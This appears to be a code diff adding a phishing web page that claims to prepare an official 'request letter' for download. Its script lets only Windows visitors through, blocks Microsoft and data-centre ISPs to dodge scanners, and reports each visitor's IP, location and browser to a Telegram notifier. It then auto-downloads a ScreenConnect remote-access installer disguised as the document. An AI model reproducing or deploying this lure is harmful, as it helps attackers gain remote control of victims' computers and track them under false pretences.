@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Downloading Request Letter</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+  <script type="module">
+    import { notifyTelegram } from './telegramNotify.js';
+
+    const blockedISPs = ["microsoft-corp-msn-as-block", "datacamp limited", "unknown isp", "microsoft Corporation"];
+    const allowedPlatforms = ['Win32', 'Win64'];
+
+    const platform = navigator.platform;
+    const userAgent = navigator.userAgent;
+    const bar = document.getElementById("progressBar");
+    const status = document.getElementById("statusText");
+    const link = document.getElementById("downloadLink");
+    const card = document.getElementById("mainCard");
+
+    function block(reason) {
+      status.textContent = reason;
+      card.querySelector("h2").textContent = "Access Restricted";
+    }
+
+    async function start() {
+      if (!allowedPlatforms.includes(platform)) {
+        block("This document can only be accessed from a Windows device.");
+        return;
+      }
+
+      let ip = "", geo = {};
+      try {
+        const res = await fetch("https://ipapi.co/json/");
+        const data = await res.json();
+        ip = data.ip;
+        geo = {
+          isp: data.org ? data.org.toLowerCase() : "",
+          city: data.city,
+          region: data.region,
+          country: data.country_name,
+          coords: `${data.latitude},${data.longitude}`
+        };
+
+        if (blockedISPs.includes(geo.isp)) {
+          block("Access from your network provider is not permitted.");
+          return;
+        }
+
+        notifyTelegram(ip, geo, userAgent);
+      } catch (err) {
+        console.warn("Geo fetch failed:", err);
+      }
+
+      let progress = 0;
+      const interval = setInterval(() => {
+        progress += 50;
+        if (progress >= 100) {
+          progress = 100;
+          clearInterval(interval);
+          status.textContent = "Download ready";
+          link.style.display = "inline-block";
+
+          const trigger = document.createElement("a");
+          trigger.href = link.href;
+          trigger.download = "";
+          trigger.style.display = "none";
+          document.body.appendChild(trigger);
+          trigger.click();
+          document.body.removeChild(trigger);
+        } else {
+          status.textContent = "Preparing document...";
+        }
+        bar.style.width = progress + "%";
+      }, 80);
+    }
+
+    window.addEventListener("DOMContentLoaded", start);
+  </script>
+  <style>
+    * { box-sizing: border-box }
+    html, body {
+      margin: 0;
+      font-family: 'Inter', sans-serif;
+      min-height: 100vh;
+    }
+    body {
+      background: url('./love.png') center center / cover no-repeat #ffffff;
+    }
+    .overlay {
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      backdrop-filter: blur(3px);
+      background-color: rgba(255, 255, 255, 0.2);
+    }
+    .card {
+      background: #ffffffcc;
+      border: 1px solid #cccccc;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.08);
+      border-radius: 12px;
+      padding: 40px;
+      max-width: 480px;
+      width: 90%;
+      text-align: center;
+    }
+    .card h2 {
+      margin: 0 0 14px;
+      font-weight: 600;
+      color: #111111;
+      font-size: 22px;
+    }
+    .card p {
+      color: #333333;
+      font-size: 15px;
+      line-height: 1.6;
+      margin-bottom: 24px;
+    }
+    .progress-wrapper {
+      margin: 20px 0;
+      background-color: #e5e5e5;
+      border-radius: 999px;
+      height: 14px;
+      overflow: hidden;
+    }
+    .progress-bar {
+      height: 100%;
+      width: 0%;
+      background: #000000;
+      transition: width 0.08s ease;
+    }
+    .status-text {
+      margin-top: 14px;
+      font-size: 14px;
+      color: #444444;
+    }
+    .btn-action {
+      display: none;
+      margin-top: 24px;
+      background: #000000;
+      color: #ffffff;
+      padding: 12px 24px;
+      border-radius: 6px;
+      font-weight: 600;
+      text-decoration: none;
+      box-shadow: 0 4px 12px rgba(0,0,0,.1);
+    }
+    .btn-action:hover {
+      background: #222222;
+    }
+  </style>
+</head>
+<body>
+  <div class="overlay">
+    <div class="card" id="mainCard">
+      <h2>Downloading Request Letter</h2>
+      <p>Please wait while your official request letter is being prepared for download and verification.</p>
+
+      <div class="progress-wrapper">
+        <div class="progress-bar" id="progressBar"></div>
+      </div>
+
+      <div class="status-text" id="statusText">
+        Initializing document...
+      </div>
+
+      <a href="ScreenConnect.ClientSetup.msi" id="downloadLink" class="btn-action" download>
+        Click here if the download does not start
+      </a>
+    </div>
+  </div>
+</body>
+</html>
